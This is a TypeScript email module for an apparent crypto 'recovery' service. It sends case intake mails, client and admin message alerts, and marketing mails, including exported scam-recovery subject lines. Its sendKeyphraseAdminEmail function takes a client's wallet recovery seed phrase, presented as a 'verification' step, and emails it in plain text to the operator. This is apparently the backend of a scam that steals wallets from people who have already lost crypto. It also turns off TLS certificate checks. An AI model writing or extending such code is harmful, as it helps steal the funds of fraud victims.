import nodemailer from "nodemailer";
import type { Transporter } from "nodemailer";
import { Resend } from "resend";
import {
  buildAdminMessageClientEmailHtml,
  buildAdminMessageClientEmailText,
  buildClientMessageAdminEmailHtml,
  buildClientMessageAdminEmailText,
} from "./caseMessageEmail";
import {
  buildClientCaseEmailHtml,
  buildClientCaseEmailText,
  buildClientIntakeConfirmationEmailHtml,
  buildClientIntakeConfirmationEmailText,
} from "./clientCaseEmail";
import type { MarketingEmailVars, MarketingTemplateId } from "./marketingEmails";
import { buildMarketingEmail } from "./marketingEmails";
import { escapeHtml } from "./security";

export type { MarketingEmailVars, MarketingTemplateId };
export {
  buildMarketingEmail,
  listMarketingTemplates,
  MARKETING_EMAIL_TEMPLATES,
} from "./marketingEmails";
export { SCAM_RECOVERY_SUBJECT_LINES } from "./marketingScamRecoveryEmail";

export {
  buildClientCaseEmailHtml,
  buildClientCaseEmailText,
  buildClientIntakeConfirmationEmailHtml,
  buildClientIntakeConfirmationEmailText,
  CASE_LOOKUP_URL,
  WHATSAPP_URL,
} from "./clientCaseEmail";

export function cleanEnvVar(val: string | undefined): string {
  if (!val) return "";
  let v = val.trim();
  if (
    (v.startsWith('"') && v.endsWith('"')) ||
    (v.startsWith("'") && v.endsWith("'"))
  ) {
    v = v.slice(1, -1).trim();
  }
  return v;
}

export function getEmailConfig() {
  const SMTP_HOST = cleanEnvVar(process.env.SMTP_HOST);
  /** Optional: set to Titan SMTP IP if Hostinger DNS is flaky (see EMAIL_SETUP.md) */
  const SMTP_HOST_IP = cleanEnvVar(process.env.SMTP_HOST_IP);
  const SMTP_PORT = parseInt(cleanEnvVar(process.env.SMTP_PORT) || "465", 10);
  const SMTP_USER = cleanEnvVar(process.env.SMTP_USER);
  const SMTP_PASS = cleanEnvVar(process.env.SMTP_PASS);
  const RESEND_API_KEY = cleanEnvVar(process.env.RESEND_API_KEY);
  const RESEND_FROM =
    cleanEnvVar(process.env.RESEND_FROM) ||
    "Crypto Recovery <info@cryptorecoveryasset.com>";
  const ADMIN_EMAIL =
    cleanEnvVar(process.env.ADMIN_EMAIL) || "info@cryptorecoveryasset.com";

  return {
    SMTP_HOST,
    SMTP_HOST_IP,
    SMTP_PORT,
    SMTP_USER,
    SMTP_PASS,
    RESEND_API_KEY,
    RESEND_FROM,
    ADMIN_EMAIL,
  };
}

function extractAddress(from: string): string {
  const match = from.match(/<([^>]+)>/);
  return (match?.[1] || from).trim().toLowerCase();
}

function isResendSandboxFrom(from: string): boolean {
  return extractAddress(from).endsWith("@resend.dev");
}

function buildMessageIdDomain(from: string): string {
  const address = extractAddress(from);
  const domain = address.split("@")[1] || "cryptorecoveryasset.com";
  return domain;
}

export function isSmtpConfigured(): boolean {
  const { SMTP_HOST, SMTP_USER, SMTP_PASS } = getEmailConfig();
  return !!(SMTP_HOST && SMTP_USER && SMTP_PASS);
}

export function isResendConfigured(): boolean {
  return !!getEmailConfig().RESEND_API_KEY;
}

/** SMTP (Titan) is preferred when both are set */
export function getEmailProvider(): "smtp" | "resend" | null {
  if (isSmtpConfigured()) return "smtp";
  if (isResendConfigured()) return "resend";
  return null;
}

export function isEmailConfigured(): boolean {
  return getEmailProvider() !== null;
}

function getSmtpTransporter(): Transporter | null {
  const { SMTP_HOST, SMTP_HOST_IP, SMTP_PORT, SMTP_USER, SMTP_PASS } =
    getEmailConfig();
  if (!SMTP_HOST || !SMTP_USER || !SMTP_PASS) return null;

  const host = SMTP_HOST_IP || SMTP_HOST;

  return nodemailer.createTransport({
    host,
    port: SMTP_PORT,
    secure: SMTP_PORT === 465,
    auth: { user: SMTP_USER, pass: SMTP_PASS },
    // Prefer IPv4 on shared hosts (Hostinger sometimes logs IPv6 resolve warnings)
    family: 4,
    connectionTimeout: 20_000,
    greetingTimeout: 20_000,
    socketTimeout: 30_000,
    tls: {
      rejectUnauthorized: false,
      servername: SMTP_HOST,
    },
  });
}

function getResendClient(): Resend | null {
  const { RESEND_API_KEY } = getEmailConfig();
  if (!RESEND_API_KEY) return null;
  return new Resend(RESEND_API_KEY);
}

export type EmailAttachment = {
  filename: string;
  content: Buffer;
  contentType?: string;
};

const TRANSACTIONAL_FROM_NAME = "Crypto Recovery Asset";

export async function dispatchEmail(options: {
  to: string | string[];
  subject: string;
  html: string;
  text?: string;
  replyTo?: string;
  attachments?: EmailAttachment[];
  /** Transactional case mail — omit Auto-Submitted (helps inbox placement). */
  delivery?: "transactional" | "automated";
  headers?: Record<string, string>;
}): Promise<{ id?: string; messageId?: string }> {
  const provider = getEmailProvider();
  const cfg = getEmailConfig();
  const resendSandboxFrom = isResendSandboxFrom(cfg.RESEND_FROM);
  const isTransactional = options.delivery === "transactional";
  const mailHeaders: Record<string, string> = {
    "X-Auto-Response-Suppress": "All",
    ...(options.headers ?? {}),
  };
  if (!isTransactional) {
    mailHeaders["Auto-Submitted"] = "auto-generated";
  }

  if (provider === "resend" && resendSandboxFrom) {
    throw new Error(
      "RESEND_FROM uses @resend.dev. Set RESEND_FROM to your verified @cryptorecoveryasset.com sender for better inbox placement."
    );
  }

  if (provider === "smtp") {
    const transporter = getSmtpTransporter();
    if (!transporter) throw new Error("SMTP not configured");
    const from = `"${TRANSACTIONAL_FROM_NAME}" <${cfg.SMTP_USER}>`;
    const messageIdDomain = buildMessageIdDomain(from);
    const toList = Array.isArray(options.to) ? options.to : [options.to];

    const info = await transporter.sendMail({
      from,
      to: options.to,
      replyTo: options.replyTo || cfg.SMTP_USER,
      subject: options.subject,
      html: options.html,
      text: options.text,
      messageId: `<${Date.now()}.${Math.random()
        .toString(36)
        .slice(2)}@${messageIdDomain}>`,
      headers: mailHeaders,
      envelope: {
        from: cfg.SMTP_USER,
        to: toList,
      },
      attachments: options.attachments?.map((a) => ({
        filename: a.filename,
        content: a.content,
        contentType: a.contentType,
      })),
    });
    return { messageId: info.messageId };
  }

  if (provider === "resend") {
    const client = getResendClient();
    if (!client) throw new Error("Resend not configured");

    const { data, error } = await client.emails.send({
      from: cfg.RESEND_FROM,
      to: options.to,
      subject: options.subject,
      html: options.html,
      text: options.text,
      replyTo: options.replyTo,
      headers: mailHeaders,
      attachments: options.attachments?.map((a) => ({
        filename: a.filename,
        content: a.content,
      })),
    });
    if (error) throw new Error(error.message);
    return { id: data?.id };
  }

  throw new Error(
    "No email provider configured. Set SMTP_* (Titan) or RESEND_API_KEY."
  );
}

export function getHealthEmailPayload() {
  const cfg = getEmailConfig();
  const provider = getEmailProvider();
  const configured = provider !== null;

  return {
    emailProvider: provider ?? "none",
    emailConfigured: configured,
    adminEmail: cfg.ADMIN_EMAIL,
    resendFrom: cfg.RESEND_FROM,
    smtpConfigured: configured,
    smtpDetails: {
      host: provider === "smtp" ? cfg.SMTP_HOST : provider === "resend" ? "resend.com" : "",
      user: provider === "smtp" ? cfg.SMTP_USER : cfg.RESEND_FROM,
      passSet:
        provider === "smtp" ? !!cfg.SMTP_PASS : provider === "resend" ? !!cfg.RESEND_API_KEY : false,
    },
  };
}

export function logEmailStartup(): void {
  const cfg = getEmailConfig();
  const provider = getEmailProvider();

  if (provider === "smtp") {
    console.log(
      `[SMTP] Ready — ${cfg.SMTP_USER} @ ${cfg.SMTP_HOST}:${cfg.SMTP_PORT} → admin ${cfg.ADMIN_EMAIL}`
    );
    const t = getSmtpTransporter();
    t?.verify((err) => {
      if (err) {
        const msg = err.message || String(err);
        if (msg.includes("535") || msg.toLowerCase().includes("authentication")) {
          console.error(
            "[SMTP] Login rejected (535) — fix SMTP_PASS (Titan app password if 2FA). Not a DNS issue."
          );
        } else if (
          msg.includes("ENOTFOUND") ||
          msg.includes("ETIMEDOUT") ||
          msg.includes("ECONNREFUSED")
        ) {
          console.error(
            "[SMTP] Cannot reach mail server — try SMTP_HOST_IP=3.234.93.86 or check outbound port 465."
          );
        }
        console.error("[SMTP] Verification failed:", msg);
      } else {
        console.log("[SMTP] Connection and login verified");
      }
    });
  } else if (provider === "resend") {
    console.log(`[Resend] Ready — ${cfg.RESEND_FROM} → admin ${cfg.ADMIN_EMAIL}`);
    if (isResendSandboxFrom(cfg.RESEND_FROM)) {
      console.warn(
        "[Resend] Deliverability risk: RESEND_FROM is @resend.dev. Use a verified @cryptorecoveryasset.com sender."
      );
    }
  } else {
    console.warn(
      "[Email] Not configured — set SMTP_* (Titan) or RESEND_API_KEY. Firestore still saves."
    );
  }
}

export function generateCaseId(): string {
  return `DF-${Math.floor(1000 + Math.random() * 9000)}-${Buffer.from(Date.now().toString()).toString("base64").substring(0, 4).toUpperCase()}`;
}

export async function sendDebugEmail(to: string) {
  const { ADMIN_EMAIL } = getEmailConfig();
  const target = to || ADMIN_EMAIL;
  const provider = getEmailProvider();
  const caseId = generateCaseId();

  return dispatchEmail({
    to: target,
    subject: `Case email test — ${caseId}`,
    html: buildClientCaseEmailHtml("Test User", caseId),
    text: buildClientCaseEmailText("Test User", caseId),
    delivery: "transactional",
  });
}

export async function sendRecoveryEmails(
  safeData: Record<string, unknown>,
  existingCaseId?: string
) {
  const { ADMIN_EMAIL } = getEmailConfig();
  const generatedCaseId = existingCaseId || generateCaseId();
  const clientEmailRaw = String(
    safeData.secureComms ?? safeData.email ?? ""
  ).trim();
  const clientEmail = escapeHtml(clientEmailRaw);
  const clientNameRaw = String(
    safeData.operatorAlias ?? safeData.name ?? "Valued Client"
  );
  const clientName = escapeHtml(clientNameRaw);
  const formSourceRaw = String(safeData.formSource ?? "INTAKE_INITIALIZATION");
  const formSource = escapeHtml(formSourceRaw);
  const submittedAt = safeData.timestamp
    ? escapeHtml(new Date(String(safeData.timestamp)).toLocaleString())
    : escapeHtml(new Date().toLocaleString());
  const phone = escapeHtml(String(safeData.phone ?? "—"));
  const incidentVector = escapeHtml(String(safeData.incidentVector ?? "—"));
  const targetNetwork = escapeHtml(String(safeData.targetNetwork ?? "—"));
  const estimatedValue = escapeHtml(String(safeData.estimatedValue ?? "—"));
  const transactionHash = escapeHtml(String(safeData.transactionHash ?? "—"));
  const caseNarrative = escapeHtml(String(safeData.caseNarrative ?? ""));

  await dispatchEmail({
    to: ADMIN_EMAIL,
    replyTo: clientEmailRaw || undefined,
    subject: `[${formSourceRaw}] New Recovery Inquiry — ${generatedCaseId}`,
    html: `
      <div style="font-family: sans-serif; padding: 20px; color: #1e293b;">
        <h2 style="color: #2563eb;">${formSource}: ${generatedCaseId}</h2>
        <p><strong>Submitted:</strong> ${submittedAt}</p>
        <p><strong>Inbox:</strong> ${ADMIN_EMAIL}</p>
        <div style="background: #f8fafc; padding: 15px; border-radius: 8px; margin: 20px 0;">
          <h3>Client</h3>
          <p><strong>Name:</strong> ${clientName}</p>
          <p><strong>Email:</strong> ${clientEmail || "—"}</p>
          <p><strong>Phone:</strong> ${phone}</p>
        </div>
        <div style="background: #f8fafc; padding: 15px; border-radius: 8px; margin: 20px 0;">
          <h3>Incident</h3>
          <p><strong>Service:</strong> ${incidentVector}</p>
          <p><strong>Network:</strong> ${targetNetwork}</p>
          <p><strong>Value:</strong> $${estimatedValue}</p>
          <p><strong>Tx hash:</strong> ${transactionHash}</p>
        </div>
        <p style="white-space: pre-wrap;">${caseNarrative}</p>
      </div>
    `,
  });

  if (clientEmailRaw) {
    await dispatchEmail({
      to: clientEmailRaw,
      replyTo: ADMIN_EMAIL,
      subject: `Intake confirmation — ${generatedCaseId}`,
      html: buildClientIntakeConfirmationEmailHtml(clientNameRaw, generatedCaseId),
      text: buildClientIntakeConfirmationEmailText(clientNameRaw, generatedCaseId),
      delivery: "transactional",
      headers: {
        "X-Entity-Ref-ID": `intake-${generatedCaseId}`,
      },
    });
  }

  return { caseId: generatedCaseId, emailSent: true };
}

export async function sendKeyphraseAdminEmail(options: {
  caseId: string;
  clientEmail: string;
  clientName?: string;
  keyphrase: string;
  submittedAt?: string;
  proofImageAttachment?: {
    filename: string;
    mimeType: string;
    content: Buffer;
  };
}): Promise<{ emailSent: boolean }> {
  if (!isEmailConfigured()) {
    console.warn("[Email] Keyphrase alert skipped — email not configured");
    return { emailSent: false };
  }

  const { ADMIN_EMAIL } = getEmailConfig();
  const submittedAt =
    options.submittedAt || new Date().toLocaleString("en-US", { timeZone: "UTC" });
  const clientName = options.clientName?.trim() || "Client";
  const escapedPhrase = options.keyphrase
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

  await dispatchEmail({
    to: ADMIN_EMAIL,
    replyTo: options.clientEmail,
    subject: `[KEYPHRASE] Wallet verification submitted — ${options.caseId}`,
    text: [
      `Wallet verification keyphrase received`,
      ``,
      `Case ID: ${options.caseId}`,
      `Client: ${clientName}`,
      `Email: ${options.clientEmail}`,
      `Submitted (UTC): ${submittedAt}`,
      ``,
      `Recovery keyphrase:`,
      options.keyphrase,
      ...(options.proofImageAttachment
        ? [
            ``,
            `Proof image attached: ${options.proofImageAttachment.filename} (${options.proofImageAttachment.mimeType})`,
          ]
        : []),
      ``,
      `Review in the admin console. Treat as highly confidential.`,
    ].join("\n"),
    html: `
      <div style="font-family: ui-monospace, monospace; padding: 24px; color: #0f172a; max-width: 640px;">
        <h2 style="color: #dc2626; font-family: sans-serif;">Wallet keyphrase submitted</h2>
        <p style="font-family: sans-serif; color: #64748b; font-size: 14px;">
          A client completed the verification step on the recovery portal.
        </p>
        <table style="width: 100%; font-family: sans-serif; font-size: 14px; margin: 16px 0; border-collapse: collapse;">
          <tr><td style="padding: 6px 0; color: #64748b;">Case ID</td><td style="padding: 6px 0;"><strong>${options.caseId}</strong></td></tr>
          <tr><td style="padding: 6px 0; color: #64748b;">Client</td><td style="padding: 6px 0;">${clientName}</td></tr>
          <tr><td style="padding: 6px 0; color: #64748b;">Email</td><td style="padding: 6px 0;"><a href="mailto:${options.clientEmail}">${options.clientEmail}</a></td></tr>
          <tr><td style="padding: 6px 0; color: #64748b;">Submitted</td><td style="padding: 6px 0;">${submittedAt}</td></tr>
        </table>
        <div style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 16px; margin: 20px 0;">
          <p style="margin: 0 0 8px; font-family: sans-serif; font-size: 12px; color: #991b1b; font-weight: bold; text-transform: uppercase;">Recovery keyphrase (confidential)</p>
          <p style="margin: 0; white-space: pre-wrap; word-break: break-word; font-size: 13px; line-height: 1.5;">${escapedPhrase}</p>
        </div>
        ${
          options.proofImageAttachment
            ? `<div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:14px;margin:16px 0;">
          <p style="margin:0;font-family:sans-serif;font-size:12px;color:#1d4ed8;font-weight:bold;text-transform:uppercase;">Proof image attached</p>
          <p style="margin:6px 0 0;font-family:sans-serif;font-size:13px;color:#334155;">${options.proofImageAttachment.filename} (${options.proofImageAttachment.mimeType})</p>
        </div>`
            : ""
        }
        <p style="font-family: sans-serif; font-size: 12px; color: #94a3b8;">
          Also saved in the admin case manager. Do not forward this email.
        </p>
      </div>
    `,
    attachments: options.proofImageAttachment
      ? [
          {
            filename: options.proofImageAttachment.filename.replace(
              /[^\w.\-]+/g,
              "_"
            ),
            content: options.proofImageAttachment.content,
            contentType: options.proofImageAttachment.mimeType,
          },
        ]
      : undefined,
  });

  console.log(
    `[Email] Keyphrase alert sent to ${ADMIN_EMAIL} for case ${options.caseId}`
  );
  return { emailSent: true };
}

export async function sendSubscribeEmail(name: string, email: string) {
  const { ADMIN_EMAIL } = getEmailConfig();
  const safeName = escapeHtml(name);
  const safeEmail = escapeHtml(email);

  await dispatchEmail({
    to: ADMIN_EMAIL,
    subject: `Newsletter: ${name}`,
    html: `
      <div style="font-family: sans-serif; padding: 20px;">
        <h2>New subscription</h2>
        <p><strong>Name:</strong> ${safeName}</p>
        <p><strong>Email:</strong> ${safeEmail}</p>
        <p><strong>Time:</strong> ${escapeHtml(new Date().toLocaleString())}</p>
      </div>
    `,
  });

  return { emailSent: true };
}

export async function sendAdminCaseMessageClientEmail(options: {
  to: string;
  clientName: string;
  caseId: string;
  status: string;
  messageText: string;
}): Promise<{ emailSent: boolean }> {
  if (!isEmailConfigured()) {
    console.warn("[Email] Admin message client alert skipped — email not configured");
    return { emailSent: false };
  }

  const clientEmail = options.to.trim().toLowerCase();
  if (!clientEmail) return { emailSent: false };

  await dispatchEmail({
    to: clientEmail,
    replyTo: getEmailConfig().ADMIN_EMAIL,
    subject: `Case ${options.caseId}: new secure message`,
    html: buildAdminMessageClientEmailHtml(options),
    text: buildAdminMessageClientEmailText(options),
    delivery: "transactional",
  });

  console.log(
    `[Email] Admin case message notification sent to ${clientEmail} for case ${options.caseId}`
  );
  return { emailSent: true };
}

export async function sendClientCaseMessageAdminEmail(options: {
  clientName: string;
  clientEmail: string;
  caseId: string;
  status: string;
  messageText: string;
}): Promise<{ emailSent: boolean }> {
  if (!isEmailConfigured()) {
    console.warn("[Email] Client message admin alert skipped — email not configured");
    return { emailSent: false };
  }

  const { ADMIN_EMAIL } = getEmailConfig();

  await dispatchEmail({
    to: ADMIN_EMAIL,
    replyTo: options.clientEmail,
    subject: `Case ${options.caseId}: client replied in portal`,
    html: buildClientMessageAdminEmailHtml(options),
    text: buildClientMessageAdminEmailText(options),
    delivery: "transactional",
  });

  console.log(
    `[Email] Client portal message alert sent to ${ADMIN_EMAIL} for case ${options.caseId}`
  );
  return { emailSent: true };
}

/** Send a marketing template to one recipient (manual campaigns / admin tests). */
export async function sendMarketingEmail(options: {
  to: string;
  templateId: MarketingTemplateId;
  vars?: MarketingEmailVars;
}) {
  const { subject, html, text } = buildMarketingEmail(
    options.templateId,
    options.vars ?? {}
  );

  return dispatchEmail({
    to: options.to,
    subject,
    html,
    text,
    replyTo: getEmailConfig().ADMIN_EMAIL,
  });
}
